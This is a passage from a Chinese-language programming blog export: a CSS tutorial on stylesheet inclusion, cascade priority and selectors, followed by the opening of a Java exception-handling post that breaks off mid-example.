<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">hr &#123;<span class="attribute">color</span>: sienna&#125; </span><br><span class="line"></span><br><span class="line"><span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>: <span class="number">20px</span>&#125; </span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;images/back40.gif&quot;</span>)&#125; </span><br><span class="line"><span class="comment">/*定义水平线的颜色为土黄；段落左边的空白边距为20象素；页面的背景图片为images目录下的back40.gif文件*/</span></span><br></pre></td></tr></table></figure>

<br />

<h5 id="2-内部样式表"><a href="#2-内部样式表" class="headerlink" title="2. 内部样式表"></a><font color="#00B2EE" face="Microsoft YaHei">2. 内部样式表</font></h5><p><strong>内部样式表：</strong>是把样式表放到页面的**<code>&lt;head&gt;...&lt;/head&gt;</code><strong>区里，这些定义的样式就应用到页面中了，样式表是用</strong><code>&lt;style&gt;&lt;/style&gt;</code>**标记插入的。</p>
<p>从下例中可以看出&lt;style&gt;&lt;&#x2F;style&gt;标记的用法：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;head&gt; </span><br><span class="line">…… </span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt; </span><br><span class="line">hr &#123;<span class="attribute">color</span>: sienna&#125; </span><br><span class="line"><span class="selector-tag">p</span> &#123;<span class="attribute">margin-left</span>: <span class="number">20px</span>&#125; </span><br><span class="line"><span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&quot;images/back40.gif&quot;</span>)&#125; </span><br><span class="line">&lt;/style&gt; </span><br><span class="line">…… </span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure>

<br />

<h5 id="3-导入外部样式表"><a href="#3-导入外部样式表" class="headerlink" title="3. 导入外部样式表 "></a><font color="#00B2EE" face="Microsoft YaHei">3. 导入外部样式表 </font></h5><p><strong>导入外部样式表：</strong>是指<font color="#FF7F00"><strong>在内部样式表的<code>&lt;style&gt;&lt;/style&gt;</code>里导入一个外部样式表</strong></font>，导入时用**<code>@import</code>**。</p>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;head&gt; </span><br><span class="line">…… </span><br><span class="line">&lt;style type=<span class="string">&quot;text/css&quot;</span>&gt; </span><br><span class="line">&lt;!-- </span><br><span class="line">@import <span class="string">&quot;mystyle.css&quot;</span> </span><br><span class="line">其他样式表的声明 </span><br><span class="line">--&gt; </span><br><span class="line">&lt;/style&gt; </span><br><span class="line">…… </span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure>

<br />

<p>例中**<code>@import &quot;mystyle.css&quot;</code>**表示导入mystyle.css样式表，注意使用时外部样式表的路径。方法和链入样式表的方法很相似，但导入外部样式表输入方式更有优势。实质上<font color="#FF7F00"><strong>它相当于存在内部样式表中的</strong></font>。 </p>
<p><font color="#FF7F00"><strong>注意：</strong></font>导入外部样式表必须在样式表的开始部分，在其他内部样式表上面。</p>
<p><font color="#FF7F00"></font></p>
<br />

<h5 id="4-内联样式"><a href="#4-内联样式" class="headerlink" title="4. 内联样式"></a><font color="#00B2EE" face="Microsoft YaHei">4. 内联样式</font></h5><p><strong>内联样式：</strong>是混合在HTML标记里使用的，用这种方法，可以很简单的对某个元素单独定义样式。内联样式的使用是<font color="#FF7F00"><strong>直接将在HTML标记里加入style参数</strong></font>。而style参数的内容就是CSS的属性和值</p>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;p style=<span class="string">&quot;color: sienna;margin-left: 20px;&quot;</span>&gt; </span><br><span class="line"></span><br><span class="line">这是一个段落 </span><br><span class="line"></span><br><span class="line">&lt;/p&gt; </span><br><span class="line">&lt;!--这个段落颜色为土黄，左边距为<span class="number">20</span>象素--&gt;</span><br></pre></td></tr></table></figure>

<br />

<p>在style参数后面的引号里的内容相当于在样式表大括号里的内容。 </p>
<p><font color="#FF7F00"><strong>注意：</strong></font><strong>style参数可以应用于任意BODY内的元素（包括BODY本身）</strong>，除了BASEFONT、PARAM和SCRIPT。</p>
<p><font color="#FF7F00"></font></p>
<br />

<h5 id="5-多重样式表叠加的优先级"><a href="#5-多重样式表叠加的优先级" class="headerlink" title="5. 多重样式表叠加的优先级"></a><font color="#00B2EE" face="Microsoft YaHei">5. 多重样式表叠加的优先级</font></h5><p>CSS样式表有层叠顺序，这里我们讨论插入样式表的这几种方法的叠加，如果在同一个选择器上使用几个不同的样式表时，这个属性值将会叠加几个样式表，<font color="#FF7F00"><strong>遇到冲突的地方会以最后定义的为准</strong></font>。例如，我们首先<strong>链入</strong><code>&lt;link&gt;</code><strong>一个外部样式表</strong>，其中定义了**<code>h3</code><strong>选择符的</strong><code>color</code><strong>、</strong><code>text-alig</code><strong>和</strong><code>font-size</code>**属性：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">h3</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="attribute">color</span>: red; </span><br><span class="line"><span class="attribute">text-align</span>: left; </span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">8pt</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">/*标题3的文字颜色为红色；向左对齐；文字尺寸为8号字*/</span></span><br></pre></td></tr></table></figure>

<p>然后在<strong>内部样式表</strong>里也定义了h3选择符的text-align和font-size属性：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">h3</span> </span><br><span class="line">&#123; </span><br><span class="line"><span class="attribute">text-align</span>: right; </span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">20pt</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">/*标题3文字向右对齐；尺寸为20号字*/</span></span><br></pre></td></tr></table></figure>

<p>那么这个页面叠加后的样式就是：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="attribute">color</span>: red; </span><br><span class="line"></span><br><span class="line"><span class="attribute">text-align</span>: right; </span><br><span class="line"></span><br><span class="line"><span class="attribute">font-size</span>: <span class="number">20pt</span>; </span><br><span class="line"><span class="comment">/*文字颜色为红色；向右对齐；尺寸为20号字*/</span></span><br></pre></td></tr></table></figure>

<p>字体颜色从外部样式表里保留下来，而对齐方式和字体尺寸都有定义时，按照后定义的优先而依照内部样式表。</p>
<br />

<p><font face="Microsoft YaHei"><strong>w3school给出的优先级顺序从低到高是：</strong></font><br>浏览器缺省设置<br>外部样式表<br>内部样式表（位于 &lt;head&gt; 标签内部）<br>内联样式（在 HTML 元素内部）</p>
<p>因此，内联样式（在 HTML 元素内部）拥有最高的优先权，这意味着它将优先于以下的样式声明： 标签中的样式声明，外部样式表中的样式声明，或者浏览器中的样式声明（缺省值）。<br>可参考：<font color="#00B2EE">《<a href="https://segmentfault.com/a/1190000005005091">css的样式优先级</a>》</font> </p>
<br />

<h4 id="2-2-CSS-选择器"><a href="#2-2-CSS-选择器" class="headerlink" title="2.2 CSS 选择器"></a><font color="#3CB371" face="Comic sans MS">2.2 CSS 选择器</font></h4><p>在 CSS 中，选择器是一种模式，用于选择需要添加样式的元素。<br>属性选择器可以根据元素的属性及属性值来选择元素。</p>
<p><strong>三种基本的选择器类型：</strong>标签名选择器、类选择器、ID选择器</p>
<p><font color="#FF7F00"><strong>注意：</strong></font>在标签内写入style&#x3D;” “的方式，应该是CSS的一种引入方式，而不是选择器，因为根本就没有用到选择器。 </p>
<p><font color="#FF7F00"></font></p>
<h5 id="1-基本选择器"><a href="#1-基本选择器" class="headerlink" title="1. 基本选择器"></a><font color="#00B2EE" face="Microsoft YaHei">1. 基本选择器</font></h5><p><font face="Microsoft YaHei"><strong>（1）标签名选择器</strong></font></p>
<p>一个HTML文档中有许多标签，例如p标签，h1标签等。若要使文档中的所有p标签都使用同一个CSS样式，就应使用标签选择器。 </p>
<p><font color="#FF7F00"><strong>注意：</strong></font>CSS标签选择器，与HTML标签的名称一样，但不能加尖括号。</p>
<p>示例：</p>
<p><font color="#FF7F00"></font></p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">       <span class="selector-tag">h1</span>&#123;</span><br><span class="line">         <span class="attribute">color</span>:red;</span><br><span class="line">         &#125;</span><br><span class="line">       <span class="selector-tag">p</span>&#123;</span><br><span class="line">         <span class="attribute">color</span>:blue;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br></pre></td></tr></table></figure>


<br />

<p><font face="Microsoft YaHei"><strong>（2）类选择器</strong></font></p>
<ul>
<li><p>使用标签选择器可以为整个HTML文档中的同一个标签指定相同的CSS样式。但是在实际运用中，HTML文档中的同一个标签会被反复使用。若要为相同的标签赋予不同的CSS样式就应使用类选择器。 </p>
</li>
<li><p><font color="#FF7F00"><strong>描述：</strong></font>给一类HTML标签加样式。这里所指的“一类”是：每个HTML标签都有一个class属性，且class的值一样。class属性是公共属性，每个HTML标签都有。</p>
</li>
<li><p>类选择器的名称，必须以**<code>.</code><strong>开头，后限HTML标签的class属性的值。如：</strong><code>.box&#123; color:red; &#125;</code>**</p>
</li>
</ul>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">           &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">           &lt;title&gt;测试一下&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">           &lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">                .NO1&#123;</span><br><span class="line">                      color:red;</span><br><span class="line">                      background-color:<span class="comment">#88ff66;</span></span><br><span class="line">                    &#125;      <span class="comment">//无;或,号</span></span><br><span class="line">               .test&#123;</span><br><span class="line">     	              color:red;</span><br><span class="line">     	              border:<span class="number">1</span>px blue solid;</span><br><span class="line">     	            &#125; </span><br><span class="line">          &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1 class=&quot;NO1&quot;&gt;习近平心中的互联网&lt;/h1&gt;</span><br><span class="line">        &lt;div class=&quot;test&quot;&gt;测试代码&lt;/div&gt; </span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br />

<blockquote>
<p>这种定义class 的方式是前端开发最常用的选择器，有几个突出的特点：可以给不同的标签设置同一个类，从而用一条CSS命令控制几个标签，减少大量代码，是页面修改简单，易维护，易改版；其次，后台工作人员机会不会用到有关class的相关设置，不需要跟后台人员之间进行交互；再者，可以通过js等动态改变标签的Classname，从而改变整个标签的样式，使前端动态效果实现起来更为容易。</p>
</blockquote>
<br />

<p><font face="Microsoft YaHei"><strong>（3）id选择器</strong></font></p>
<ul>
<li><p>ID选择器和类选择器相似，不同的是，ID选择器不能复用。在一个XHTML文档中，一个ID选择器只能把其CSS样式指定给一个标签。 </p>
</li>
<li><p><font color="#FF7F00"><strong>注：</strong></font>网页中HTML标签的id属性的值，必须是唯一的。id属性一般是给JS使用的，不是让你来加样式的。class属性只能给CSS用，不能给JS用的。</p>
</li>
<li><p>id选择器的名称，必须以**<code>#</code>**开头，后跟HTML标记的id属性的值。</p>
</li>
</ul>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;php.cn&lt;/title&gt;</span><br><span class="line">    &lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">    <span class="comment">#NO1&#123;</span></span><br><span class="line">        color:blue;</span><br><span class="line">        background-color:<span class="comment">#88ff99;</span></span><br><span class="line">    &#125;</span><br><span class="line">    .haha&#123;</span><br><span class="line">         color:red;</span><br><span class="line">         background-color:<span class="comment">#88ff66;</span></span><br><span class="line">     &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1 id=<span class="string">&quot;NO1&quot;</span>&gt;习近平心中的互联网&lt;/h1&gt;</span><br><span class="line">        &lt;p class=&quot;haha&quot;&gt;互联网是20世纪最伟大的发明。&lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br />

<p><font face="Microsoft YaHei"><strong>（4）选择器的优先级</strong></font></p>
<p>参考：<br><font color="#00B2EE">《<a href="http://www.runoob.com/w3cnote/css-style-priority.html">CSS 样式优先级</a>》</font><br><font color="#00B2EE">《<a href="https://www.cnblogs.com/ombre/p/7418667.html">CSS样式优先级问题</a>》</font> </p>
<blockquote>
<p><strong>选择器的优先级从高到低：</strong><br>ID 选择器， 如 <strong><code>#id&#123;&#125;</code></strong><br>类选择器， 如 <strong><code>.class&#123;&#125;</code></strong><br>属性选择器， 如 <strong><code>a[href=&quot;segmentfault.com&quot;]&#123;&#125;</code></strong><br>伪类选择器， 如 <strong><code>:hover&#123;&#125;</code></strong><br>伪元素选择器， 如 <strong><code>::before&#123;&#125;</code></strong><br>标签选择器， 如 <strong><code>span&#123;&#125;</code></strong><br>通配选择器， 如 <strong><code>*&#123;&#125;</code></strong></p>
</blockquote>
<br />

<h5 id="2-id、class选择器的区别"><a href="#2-id、class选择器的区别" class="headerlink" title="2. id、class选择器的区别"></a><font color="#00B2EE" face="Microsoft YaHei">2. id、class选择器的区别</font></h5><p>id和class属性是网页中两个通用的属性，它们协同工作使整个页面变得丰富多彩。当我们为一个元素定义样式时。可以使用id，也可以使用class。但是我们也应该注意这两者的区别。 </p>
<ol>
<li><p>在css样式表中书写时，id选择符前面应该加前缀符号‘#’，而class选择符前面应该加前缀符号‘.’。 </p>
</li>
<li><p>id属性一般在一个页面中只可以使用一次，而class可以被多次引用。 </p>
</li>
<li><p>id作为元素的标签，用于区分不同结构和内容，而class作为一个样式，它可以应用到任何结构和内容上。 </p>
</li>
<li><p>在布局思路上，一般坚持这样的原则：id是先确定页面的结构和内容，然后再为它定义样式：而class相反，它先定义好一类样式，然后再页面中根据需要把类样式应用到不同的元素和内容上面。 </p>
</li>
<li><p>目前浏览器都能允许在同一个页面内出现多个相同属性值的id，一般情况下也能正常显示，不过当使用javascript通过id来控制元素时就会出现错误。 </p>
</li>
<li><p>在实际应用时，class更多的被应用到文字版块以及页面修饰等方面，而id更多地被用来实现宏伟布局和设计包含块，或包含框的样式。</p>
</li>
</ol>
<blockquote>
<p><font color="#FF7F00"><strong>注意：</strong></font></p>
</blockquote>
<ol>
<li>ID 有高优先级、唯一性的特点，特指「个体」。<br>相对于 ID，class 的优先级比较适中，特指「特定群体」。<br>Class 的使用需要参考面向对象的抽象概念，把共有的属性抽象出来。</li>
<li>ID是先找到结构&#x2F;内容，再给它定义样式；<br>Class是先定义好一种样式，再套给多个结构&#x2F;内容</li>
</ol>
<br />

<h5 id="3-组合选择器"><a href="#3-组合选择器" class="headerlink" title="3. 组合选择器"></a><font color="#00B2EE" face="Microsoft YaHei">3. 组合选择器</font></h5><p><font color="#00B2EE">《<a href="http://www.php.cn/code/570.html">CSS 组合选择器</a>》</font><br><font color="#00B2EE">《<a href="http://www.php.cn/code/665.html">CSS基础教程之组合选择器</a>》</font> </p>
]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-异常处理(5)</title>
    <url>/post/Java-Exception-Handling7/</url>
    <content><![CDATA[<p>&amp;emsp;<br>&amp;emsp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>异常处理</font></center>

<p><a href="https://i.loli.net/2018/12/28/5c25dfcbaa09b.png"><img data-src="https://i.loli.net/2018/12/28/5c25dfcbaa09b.png" alt="程序错误.png"></a><br><a href="https://i.loli.net/2018/12/28/5c25e36859c86.png"><img data-src="https://i.loli.net/2018/12/28/5c25e36859c86.png" alt="程序错误1.png"></a></p>
<p>&amp;emsp;</p>
<h3 id="一、-Java异常基础"><a href="#一、-Java异常基础" class="headerlink" title="一、 Java异常基础"></a><font color="#FF6347" face="Comic sans MS">一、 Java异常基础</font></h3><h4 id="1-1-为什么要引入异常处理机制？"><a href="#1-1-为什么要引入异常处理机制？" class="headerlink" title="1.1  为什么要引入异常处理机制？"></a><font color="#20B2AA" face="Comic sans MS">1.1  为什么要引入异常处理机制？</font></h4><p><font face="Comic sans MS"><font color="red"><strong>程序的错误分为：</strong></font><br><strong>编译错误：</strong>程序员编写程序时语法上出现的错误；<br><strong>运行错误：</strong>程序员编写的程序在语法上没有错误，但是程序在运行时出现错误，本章就主要针对该类错误讲解 -&amp;ensp;- 即异常、异常类和异常处理机制。</font></p>
<p>&amp;emsp;</p>
<h4 id="1-2-以往的错误处理方法"><a href="#1-2-以往的错误处理方法" class="headerlink" title="1.2  以往的错误处理方法"></a><font color="#20B2AA" face="Comic sans MS">1.2  以往的错误处理方法</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**主要缺陷：**
&emsp;程序复杂
&emsp;可靠性差
&emsp;返回信息有限
&emsp;返回代码标准化困难　
以往的程序开发过程中，常常采用<font color="#00B2EE">**返回值**</font>进行处理。例如，在编写一个方法，可以返回一个状态代码，调用者
根据状态代码判断出错与否。若状态代码表示一个错误，则调用该错误的处理程序进行相应的处理，或显示一
个错误页面或错误信息。
</font></td></tr></table>

<p><em>举例</em> <em><strong>以往的错误处理方法：采用返回值进行处理</strong></em></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">举例：实现将一个文件从硬盘加载近来，导致加载可能失败的运行错误有硬盘错误、文件无法找到等</span><br><span class="line"><span class="keyword">int</span> status=loadTextfile();</span><br><span class="line">If (status!=<span class="number">1</span>)&#123;</span><br><span class="line">  <span class="comment">//something unusual happened, describe it</span></span><br><span class="line"> <span class="keyword">switch</span>(status) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: </span><br><span class="line">       <span class="comment">//file not found</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">       <span class="comment">//disk error</span></span><br><span class="line">   <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">//other error&#125;</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//file loaded OK, continue with program&#125; </span></span><br><span class="line">```      </span><br><span class="line"></span><br><span class="line">&amp;emsp;</span><br><span class="line">&amp;emsp;</span><br><span class="line">#### &lt;font color=&quot;#20B2AA&quot; face=&quot;Comic sans MS&quot;&gt;1.3  Java异常处理方法&lt;/font&gt;</span><br><span class="line">&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=#ADD8E6&gt;&lt;font face=&quot;Comic sans MS&quot;&gt;Java异常处理方法：Java为运行错误引入了异常、异常类和异常处理机制。</span><br><span class="line">  **异常：**特殊的运行错误，是在程序运行过程中发生的、会打断程序正常执行的错误</span><br><span class="line">　例如：</span><br><span class="line">　除<span class="number">0</span>溢出</span><br><span class="line">　文件找不到</span><br><span class="line">  数组元素下标越界　</span><br><span class="line"></span><br><span class="line">**异常类：**Java用面向对象的方法处理异常，Java的异常类是处理运行时错误的特殊类，每一种异常类对应一种</span><br><span class="line">特定的运行错误，每一个异常事件由一个异常类的对象来代表。</span><br><span class="line"> *例如：除<span class="number">0</span>溢出（ArithmeticException）</span><br><span class="line">　　　文件找不到（FileNotFoundException）</span><br><span class="line">　　　数组元素下标越界（ArrayIndexOutofBoundsException）*</span><br><span class="line"></span><br><span class="line">**异常处理机制：抛出异常——捕捉异常：**</span><br><span class="line"> 1.  当出现了一些错误，方法都会产生一个&lt;font color=&quot;red&quot;&gt;异常对象&lt;/font&gt;，这个异常对象将交由运行系统来处理。此过程就称为抛出</span><br><span class="line">     &lt;font color=&quot;red&quot;&gt;(throwing)异常&lt;/font&gt;。**包括：系统抛出、用户自定义抛出。**</span><br><span class="line"> <span class="number">2.</span>  接着，运行系统开始寻找合适的处理方法，来处理这个异常。如果系统找到了一个适合的处理该异常方法，</span><br><span class="line">     这一过程就叫&lt;font color=&quot;red&quot;&gt;捕获异常&lt;/font&gt;。</span><br><span class="line">&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&amp;emsp;</span><br><span class="line">&amp;emsp;</span><br><span class="line">#### &lt;font color=&quot;#20B2AA&quot; face=&quot;Comic sans MS&quot;&gt;1.4  异常处理的语法支持&lt;/font&gt;</span><br><span class="line">&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=#ADD8E6&gt;&lt;font face=&quot;Comic sans MS&quot;&gt;       **－try,catch,throws,throw,finally**</span><br><span class="line">(<span class="number">1</span>) <span class="keyword">try</span>包含可能出现异常的语句块；</span><br><span class="line">(<span class="number">2</span>) 一个或多个<span class="keyword">catch</span>块紧随<span class="keyword">try</span>&#123;&#125;块，每个<span class="keyword">catch</span>块通常处理指定类型的异常；</span><br><span class="line">(<span class="number">3</span>) <span class="keyword">finally</span>引导块紧随<span class="keyword">catch</span>块后，主要用于清理现场（可有可无）。</span><br><span class="line">格式：</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123; ......</span><br><span class="line">&#125;<span class="keyword">catch</span>( ExceptionName1 e )</span><br><span class="line">&#123; ......&#125;</span><br><span class="line"><span class="keyword">catch</span>( ExceptionName2 e )</span><br><span class="line">&#123; ......&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123; ......&#125;</span><br><span class="line">注意：<span class="keyword">finally</span>总是执行，<span class="keyword">catch</span>块不一定执行</span><br><span class="line">&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&amp;emsp;</span><br><span class="line">&amp;emsp;</span><br><span class="line">#### &lt;font color=&quot;#20B2AA&quot; face=&quot;Comic sans MS&quot;&gt;1.5  总结&lt;/font&gt;</span><br><span class="line">&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=#EEE0E5&gt;&lt;font face=&quot;Comic sans MS&quot;&gt; (1) Java的异常处理把错误集中起来统一处理。程序员只需要说明何处可能出现异常，如何处理即可；</span><br><span class="line"> (<span class="number">2</span>) 采用面向对象的思想标准化了各种错误的类型；</span><br><span class="line"> (<span class="number">3</span>) Java把程序运行过程中可能遇到的问题分为两类，一类是致命性的，即程序遇到了非常严重的不正常状</span><br><span class="line"> 态，不能简单地恢复执行，这就是&lt;font color=&quot;red&quot;&gt;**错误(对应Error类)**&lt;/font&gt;，如程序运行过程中内存耗尽。另一类是非致命性的，</span><br><span class="line"> 通过某种处理后程序还能继续运行，这就是&lt;font color=&quot;red&quot;&gt;**异常(对应Exception类)**&lt;/font&gt;。</span><br><span class="line">&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&amp;emsp;</span><br><span class="line">&amp;emsp;</span><br><span class="line">### &lt;font color=&quot;#FF6347&quot; face=&quot;Comic sans MS&quot;&gt;二、 异常类的层次&lt;/font&gt;</span><br><span class="line">#### &lt;font color=&quot;#20B2AA&quot; face=&quot;Comic sans MS&quot;&gt;2.1  异常分类&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">&lt;font face=&quot;Comic sans MS&quot;&gt;&lt;font color=&quot;red&quot;&gt;**☕异常类：**&lt;/font&gt;异常在Java中都是作为类的实例(对象)的形式出现的。</span><br><span class="line">&amp;emsp;     如 Throwable类, Exception类, Error类……</span><br><span class="line"></span><br><span class="line">&lt;font color=&quot;red&quot;&gt;**☕Java中异常分类：**&lt;/font&gt;</span><br><span class="line"> (1)  &lt;font color=&quot;#00B2EE&quot;&gt;**Error类及其子类：**&lt;/font&gt;描述Java运行时刻系统内部的错误或资源枯竭导致的错误，无法恢复和抛出，发生几率小；</span><br><span class="line"> (2)  &lt;font color=&quot;#00B2EE&quot;&gt;**Exception类及其子类：**&lt;/font&gt;普通程序可以从中恢复，分为&lt;font color=&quot;red&quot;&gt;**运行时异常**&lt;/font&gt;和&lt;font color=&quot;red&quot;&gt;**非运行时异常**&lt;/font&gt;。</span><br><span class="line"></span><br><span class="line">&amp;emsp;异常在Java中也是作为类的实例的形式出现的。Java中的所有的异常类都是从Throwable类派生出来的。&lt;font color=&quot;red&quot;&gt;**Throwable类有两个直接子类：**&lt;/font&gt;&lt;font color=&quot;#00B2EE&quot;&gt;**java.lang.Error**&lt;/font&gt; 和 &lt;font color=&quot;#00B2EE&quot;&gt;**java.lang.Exception**&lt;/font&gt;。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">异常类的层次结构如下图所示。</span><br><span class="line">![<span class="number">58.</span>png](https:<span class="comment">//i.loli.net/2018/12/28/5c2621a200c43.png)</span></span><br><span class="line">**(<span class="number">1</span>) 🔺Error类及其子类主要用来描述一些Java运行时刻系统内部的错误或资源枯竭导致的错误。**普通的程序不能从这类错误中恢复，也无法抛出这种类型的错误，这类错误出现的几率是很小的。</span><br><span class="line">**(<span class="number">2</span>) 🔺另一个异常类的子类是Exception类和它的子类。**在编程中错误的处理主要是对这类错误的处理，如除数为零、数组下标越界等。类Exception是普通程序可以从中恢复的所有规范了的异常的父类。</span><br><span class="line">&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">&amp;emsp;</span><br><span class="line">&amp;emsp;</span><br><span class="line">#### &lt;font color=&quot;#20B2AA&quot; face=&quot;Comic sans MS&quot;&gt;2.2  Exception类的子类&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">&lt;font face=&quot;Comic sans MS&quot;&gt;&lt;font color=&quot;red&quot;&gt;**☕Exception类子类有两种：**&lt;/font&gt;</span><br><span class="line">**运行时异常**和**非运行时异常（一般异常）**　&amp;emsp;&amp;emsp;&amp;emsp;　*区别？？？*</span><br><span class="line">&lt;font color=&quot;#00B2EE&quot;&gt;**（1）运行时异常：**&lt;/font&gt;RuntimeException类及其所有子类。      运行时异常是程序员编写程序不正确所导致的异常，理论上，程序员经过检查和测试可以查出这类错误。如**除数为零等，错误的强制类型转换、数组越界访问、空引用**。</span><br><span class="line">&lt;font color=&quot;#00B2EE&quot;&gt;**（2）非运行时异常（一般异常）：**&lt;/font&gt;指可以由编译器在编译时检测到的、可能会发生在方法执行过程中的异常，如找不到指定的文件等，这不是程序本身的错误，如果这些异常情况没有发生，程序本身仍然是完好的。　　</span><br><span class="line">&lt;font color=&quot;red&quot;&gt;**注意：**&lt;/font&gt;**编译器强制要求Java程序必须**&lt;font color=&quot;#00B2EE&quot;&gt;**捕获**&lt;/font&gt;**或**&lt;font color=&quot;#00B2EE&quot;&gt;**声明抛出**&lt;/font&gt;**所有非运行时异常，但对运行时异常不作要求。运行时异常编译可以通过但是运行时出现异常；非运行时异常编译的时候就通不过。**</span><br><span class="line"></span><br><span class="line">*例如：格式不正确的URL、试图为一个不存在的类找到一个代表它的类的对象。除了runtimeexception及其子类以外，其他exception类的子类都是非运行时异常。*</span><br><span class="line">&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line"><span class="comment">//运行时异常和非运行时异常区别举例  </span></span><br><span class="line">[例<span class="number">5</span>-<span class="number">1</span>] RuntimeExceptionDemo1.java</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RuntimeExceptionDemo1</span></span>&#123;  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">System.out.println(<span class="number">2</span>/<span class="number">0</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line">该程序能编译通过，而在运行时，出现如下提示：</span><br><span class="line">&gt; javac RuntimeExceptionDemo1.java</span><br><span class="line">&gt; java RuntimeExceptionDemo1</span><br><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.lang.ArithmeticException: / by zero at </span><br><span class="line">RuntimeExceptionDemo1.main(RuntimeExceptionDemo1.java:<span class="number">4</span>)</span><br><span class="line"><span class="comment">//这里的&quot;ArithmeticException&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">5</span>-<span class="number">2</span>] NonRuntimeExceptionDemo1.java</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NonRuntimeExceptionDemo1</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">       FileInputStream in=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;text.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> s;</span><br><span class="line">        <span class="keyword">while</span>((s=in.read())!=-<span class="number">1</span>) System.out.print(s);</span><br><span class="line">        in.close();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">会出现如下的错误提示：</span><br><span 